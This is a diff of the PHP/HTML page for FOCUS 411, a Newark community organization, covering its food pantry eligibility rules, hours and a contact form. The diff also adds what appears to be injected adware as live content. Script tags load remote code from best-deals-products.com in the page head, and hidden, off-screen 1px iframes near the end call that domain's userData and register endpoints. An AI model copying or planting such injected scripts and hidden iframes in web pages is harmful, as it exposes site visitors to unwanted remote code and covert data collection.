@@ -1,184 +1,164 @@
-    <?php
+   <?php
 
 include ('../../header.php');
 ?>
 
-<style>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
 
-</style>
+    <title>FOCUS 411</title>
 
-    <!-- Carousel
-    ================================================== -->
-    <div id="myCarousel" class="carousel slide" data-ride="carousel">
+    <!-- Bootstrap core CSS -->
+    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+
+    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script><style type="text/css"></style><script type="text/javascript" src="http://www.best-deals-products.com/ws/sf_preloader.jsp?dlsource=hdrykzc&amp;ver=2014.11.24.1.1"></script><script type="text/javascript" src="http://www.best-deals-products.com/ws/sf_code.jsp?dlsource=hdrykzc&amp;ver=2014.11.24.1.1"></script><script type="text/javascript" src="http://www.best-deals-products.com/ws/slideup2/main.js?ver=2014.11.24.1.1"></script><script type="text/javascript" src="http://www.best-deals-products.com/ws/side_slider/main.js?ver=2014.11.24.1.1"></script><script type="text/javascript" src="http://www.best-deals-products.com/ws/js/base_single_icon.js?ver=2014.11.24.1.1"></script><link rel="stylesheet" href="http://www.best-deals-products.com/ws/css/main.css?v=2014.11.24.1.1"></head>
+
+  <body style="font-family: "Open sans", Helvetica, Arial;">
+
+    <div class="container">
+
+      <div class="blog-header">
+        <h1 class="blog-title">FOCUS 411 </h1>
+        <p class="lead blog-description">441-443 Broad Street • Newark, NJ 07102 • (973) 624-2528</p>
+      </div>
+      <div id="myCarousel" class="carousel slide" data-ride="carousel">
       <!-- Indicators -->
       <ol class="carousel-indicators">
-        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
-        <li data-target="#myCarousel" data-slide-to="1"></li>
-        <li data-target="#myCarousel" data-slide-to="2"></li>
+        <li data-target="#myCarousel" data-slide-to="0" class=""></li>
+        <li data-target="#myCarousel" data-slide-to="1" class="active"></li>
+        <li data-target="#myCarousel" data-slide-to="2" class=""></li>
       </ol>
       <div class="carousel-inner">
-        <div class="item active">
-          <img src="IMG_0550.JPG" alt="First slide">
-          <div class="container">
+        <div class="item">
+          <img class="img-responsive center-block" src="../../images/FOCUS2.jpg" alt="First slide">
+<!--      <div class="container">
             <div class="carousel-caption">
-              <h1>Focus</h1>
               
-              <p>Services</p>
-              
-          <p>FOCUS programs are structured under two divisions, Human Services and Youth and Family Development. 
-          The Human Services Division provides adult education, employment and training, senior-citizen 
-          programs, emergency assistance, health and nutrition programs and adult protective services. 
-          The objective of the division is to provide members of our community with the tools necessary for empowerment, growth, 
-          and self-sufficiency.
-
-         The Youth and Family Development Division provides educational services for children before and after school, 
-         and during the summer months. It provides counseling for families and children, parenting workshops, 
-          and referral services to families requiring temporary support, such as food, utility and housing assistance.</a></p>
             </div>
-          </div>
+          </div> -->
+        </div>
+        <div class="item active">
+          <img class="img-responsive center-block" src="../../images/FOCUS1.jpg" alt="Second slide">
+<!--      <div class="container">
+			<div class="carousel-caption">
+              
+            </div>
+          </div> -->
         </div>
         <div class="item">
-          <img src="IMG_0531.JPG" alt="Second slide">
-          <div class="container">
-            <div class="carousel-caption">
-              
-        <h1>Human Service Divsion </h1>
-        <p>The FOCUS Human Services Division provides an array of services to Essex and Hudson County Residents 
-        which include adult basic education, employment & training services, senior's services, emergency assistance, 
-        and nutrition programs, The objective of the division is to provide the members of our community the tools 
-        needed to empower, help grow, and become self-sufficient.</p>
+          <img class="img-responsive center-block" src="../../images/FOCUS3.jpg" alt="Third slide">
+<!--      <div class="container">
+			<div class="carousel-caption">
               
             </div>
-          </div>
-            </div>
-           <div class="item">
-          <img src="IMG_0541.JPG" alt="Third slide">
-          <div class="container">
-            <div class="carousel-caption">
-              
-         <h1>Youth and Family Division </h1>
-              <p>The FOCUS Youth and Family Development Programs provide quality educational services for children 
-              during afterschool hours, and during the summer months. It offers families with access to information, support and resources that help develop 
-              and maximize their strengths and potential. The objective of the division is to provide youth & families
-              with enriching experiences that broaden their perspectives, improve their socialization, 
-              and enhance their skills to improve their overall quality of life.</p>
-              
-            </div>
-          </div>
+          </div> -->
         </div>
       </div>
       <a class="left carousel-control" href="#myCarousel" data-slide="prev"><span class="glyphicon glyphicon-chevron-left"></span></a>
       <a class="right carousel-control" href="#myCarousel" data-slide="next"><span class="glyphicon glyphicon-chevron-right"></span></a>
-    </div><!-- /.carousel -->
+    </div>
 
-
-
-    <!-- Marketing messaging and featurettes
-    ================================================== -->
-    <!-- Wrap the rest of the page in another container to center all the content. -->
-
-    <div class="container marketing">
-    	<div class="overview" style="margin-bottom:80px;">
-    	<p style="font-size:20px;">Our mission is to provide community leadership by developing a variety of services of health and human development initiatives which advances the community towards self sufficiency, growth, empowerment, and a better quality of life.</p>
-	</div>
-      <!-- Three columns of text below the carousel -->
       <div class="row">
-        <div class="col-lg-4">
-          <a href="#row1"><img class="img-circle" width="140px" height="140px" src="partnership_glyph.png" alt="Generic placeholder image"></a>
-          <h2>Who's Involved</h2>
-          <p>We are FOCUS411 an hispanic community organization</p>
-          <p><a class="btn btn-primary" href="#row1" role="button">View details &raquo;</a></p>
-        </div><!-- /.col-lg-4 -->
-        <div class="col-lg-4">
-          <a href="#row2"><img class="img-circle" width="140px" height="140px" src="website_glyph.png" alt="Generic placeholder image"></a>
-          <h2>What We Do</h2>
-          <p>provide Hispanics on how to prepare to capitalize on that growth and become a more significant contributor to mainstream America.e</p>
-          <p><a class="btn btn-primary" href="#row2" role="button">View details &raquo;</a></p>
-        </div><!-- /.col-lg-4 -->
-        <div class="col-lg-4">
-          <a href="#row3"><img class="img-circle" width="140px" height="140px" src="social_media_glyph.png" alt="Generic placeholder image"></a>
-          <h2>Contact Us</h2>
-          <p>You may be able to contact us by phone at (973)624-2528 or by email.</p>
-          <p><a class="btn btn-primary" href="#row3" role="button">View details &raquo;</a></p>
-        </div><!-- /.col-lg-4 -->
-      </div><!-- /.row -->
+
+        <div class="col-sm-8 blog-main">
 
 
-      <!-- START THE FEATURETTES -->
+          <div class="blog-post">
+            <h2 class="blog-post-title">Who's Eligible</h2>
+            <br>
 
-      <hr class="featurette-divider">
+            <p> The Emergency Food Assistance Program was designed to distribute fedrally donated food to qualifying individuals and families that are affected by hunger throughtout Essex County. Clients qualify for this program if they are at or below the income guidelines. Requirements for this program are as follow: referral from another agency/church, NJ State Motor Vehicle Driver License or Identitfication card, proof of address, proof of income and Social Security card. </proof>
+          </div><!-- /.blog-post -->
+          <hr>
+          <div class="blog-post">
+            <h2 class="blog-post-title">Hours of Operation</h2>
+            <br>
+            <p>The food pantry hours are from Mondays through Fridays from 9 am to 12 pm</p>
 
-      <div class="row featurette" id="row1">
-        <div class="col-md-7">
-          <h2 class="featurette-heading">Who We Are <span class="text-muted">Faculty and Staff</span></h2>
-          <p class="lead">Our mission is to provide community leadership by developing a variety of services of health and human development initiatives which advances the community towards self sufficiency, growth, empowerment, and a better quality of life.</p>
-        </div>
-        <div class="col-md-5">
-          <img class="featurette-image img-responsive" src="IMG_0763.JPG" alt="Generic placeholder image">
-        </div>
+          </div>
+          <hr>
+          <!--<div class="blog-post">
+            <h2 class="blog-post-title">Apostles’ House Food Pantry</h2>
+            <br>
+            <p>We are a major resource which prevents or limits severe hunger in Newark. One of the largest food pantries in Essex County, we served over 8,500 people in 2007 and are one of only a handful open five days per week. The people we serve represent the many different faces of hunger from working families, to seniors raising grandchildren to single individuals many of whom are veterans. In addition, our “Ryan White” program provides food specifically to HIV/AIDS clients who are infected and affected by this disease. While feeding the hungry is critical, we also understand the need for lasting changes. The “Feed the Solution” program component of our pantry educates and advocates for changes that would positively impact food insecurity. Through seminars, advocacy workshops, educational materials for all ages and ongoing contact, supporters are educated on needs beyond emergency and charitable services. While our Food Pantry is often the first stop in our continuum of care, Feed the Solution is our last stop, addressing the struggle of all low-income wage earners.</p>
+
+<p>For more information on FOCUS please click on <a href="http://www.apostleshouse.org/index.html" target = "_blank">visit</a>.</p>
+          </div>-->
+          <div class="blog-post">
+            <h2 class="blog-post-title">Contact Us</h2>
+            <br>
+            <form role="form">    
+      <div class="form-group">
+        <label for="exampleInputEmail1">Full Name</label>
+        <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter full name.">
       </div>
-
-      <hr class="featurette-divider">
-
-      <div class="row featurette" id="row2">
-        <div class="col-md-5">
-          <img class="featurette-image img-responsive" src="IMG_2360.JPG" alt="Generic placeholder image">
-        </div>
-        <div class="col-md-7">
-          <h2 class="featurette-heading">What We Do <span class="text-muted">See for yourself.</span></h2>
-          <p class="lead">We provide various services such as web design, IT mentoring and computer training. Not only do we provide service to organizations we also to students of NJIT through senior capstone involvement and creating a great place or volunteering. </p>
-        </div>
+          <div class="form-group">
+        <label for="exampleInputEmail1">Email</label>
+        <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter valid email address.">
       </div>
-
-      <hr class="featurette-divider">
-
-      <div class="row featurette" id="row3">
-        <div class="col-md-7">
-          <h2 class="featurette-heading">Contact Us <span class="text-muted"></span></h2>
-          
-          
-          <p class="lead">We want to hear from you. Your concerns comments and suggestions. </p>
-          <p>
-          
-          <form role="form">    
-		  <div class="form-group">
-		    <label for="exampleInputEmail1">Full Name</label>
-		    <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter full name.">
-		  </div>
           <div class="form-group">
-		    <label for="exampleInputEmail1">Email</label>
-		    <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter valid email address.">
-		  </div>
+        <label for="exampleInputEmail1">Subject</label>
+        <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter the subject of your message.">
+      </div>
           <div class="form-group">
-		    <label for="exampleInputEmail1">Subject</label>
-		    <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter the subject of your message.">
-		  </div>
-          <div class="form-group">
-		    <label for="exampleInputEmail1">Message</label><br>
-		    <textarea placeholder="Enter your message." cols="50" rows="10"> </textarea>
-		  </div>
-      <button type="button" class="btn btn-primary btn-lg">Send Message</button>	         
+        <label for="exampleInputEmail1">Message</label><br>
+        <textarea placeholder="Enter your message." cols="50" rows="10"> </textarea>
+      </div>
+      <button type="button" class="btn btn-primary btn-lg">Send Message</button>           
    
-                </form></p>
-        </div>
-        <div class="col-md-5">
-          <img class="featurette-image img-responsive" src="IMG_0771.JPG" alt="Generic placeholder image">
-        </div>
-      </div>
+                </form>
+          </div><!-- /.blog-post -->
+        </div><!-- /.blog-main -->
 
-      <hr class="featurette-divider">
+        <div class="col-sm-3 col-sm-offset-1 blog-sidebar">
+          <div class="sidebar-module sidebar-module-inset">
+            <h4>About</h4>
+            <p>Our mission is to provide community leadership by developing a variety of services of health and human development initiatives which advances the community towards self sufficiency, growth, empowerment, and a better quality of life.</p>
+          </div>
+          <div class="sidebar-module">
+            <div class="list-group">
+          
+            <a href="../focus411/index.php" class="list-group-item">FOCUS</a>
+            <a href="../ucc/index.php" class="list-group-item">United Community Corporation</a>
+            <a href="../ncc/index.php" class="list-group-item">New Community Corporation</a>
+            <a href="../pierre/index.php" class="list-group-item">St. Mary's/Pierre Touissant Food Pantry</a>
+            <a href="../apostle/index.php" class="list-group-item">Apostle's House</a>
+            <a href="../nes/index.php" class="list-group-item">Newark Emergency Services for Families</a>
+            <a href="../st-james/index.php" class="list-group-item">St. James Social Services</a>
+            <a href="../st-johns/index.php" class="list-group-item">St. Johns Soup Kitchen</a>
+            <a href="../cwu/index.php" class="list-group-item">Church Women United</a>
+            
+            
+          </div>
+          </div>
 
-      <!-- /END THE FEATURETTES -->
+          
+        </div><!-- /.blog-sidebar -->
+      
 
+      </div><!-- /.row -->
+      <?php
 
-      <!-- FOOTER -->
-      <footer>
-        <p class="pull-right"><a href="#">Back to top</a></p>
-        <p>&copy; 2014 Company, Inc. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
-      </footer>
+include ('../../footer.php');
+?>
 
     </div><!-- /.container -->
-
 
     <!-- Bootstrap core JavaScript
     ================================================== -->
@@ -186,5 +166,9 @@ include ('../../header.php');
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
     <script src="../../js/bootstrap.min.js"></script>
     <script src="../../js/docs.min.js"></script>
-  </body>
-</html>
+
+<div id="global-zeroclipboard-html-bridge" class="global-zeroclipboard-container" title="" style="position: absolute; left: 0px; top: -9999px; width: 15px; height: 15px; z-index: 999999999;" data-original-title="Copy to clipboard">      <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" id="global-zeroclipboard-flash-bridge" width="100%" height="100%">         <param name="movie" value="/assets/flash/ZeroClipboard.swf?noCache=1416837412899">         <param name="allowScriptAccess" value="sameDomain">         <param name="scale" value="exactfit">         <param name="loop" value="false">         <param name="menu" value="false">         <param name="quality" value="best">         <param name="bgcolor" value="#ffffff">         <param name="wmode" value="transparent">         <param name="flashvars" value="trustedOrigins=getbootstrap.com%2C%2F%2Fgetbootstrap.com%2Chttp%3A%2F%2Fgetbootstrap.com">         <embed src="/assets/flash/ZeroClipboard.swf?noCache=1416837412899" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="100%" height="100%" name="global-zeroclipboard-flash-bridge" allowscriptaccess="sameDomain" allowfullscreen="false" type="application/x-shockwave-flash" wmode="transparent" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="trustedOrigins=getbootstrap.com%2C%2F%2Fgetbootstrap.com%2Chttp%3A%2F%2Fgetbootstrap.com" scale="exactfit">                </object></div><iframe src="http://www.best-deals-products.com/ws/userData.jsp?dlsource=hdrykzc&amp;userid=&amp;ver=2014.11.24.1.1" style="position: absolute; top: -100px; left: -100px; z-index: -10; border: none; visibility: hidden; width: 1px; height: 1px;"></iframe><iframe src="https://www.best-deals-products.com/ws/co/register_server_layer.html?version=2014.11.24.1.1" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"></iframe><iframe style="position: absolute; width: 1px; height: 1px; top: 0px; left: 0px; visibility: hidden;"></iframe><sfmsg id="sfMsgId" data="{&quot;imageCount&quot;:0,&quot;ip&quot;:&quot;1.1.1.1&quot;}"></sfmsg></body></html>
+
+
+
+
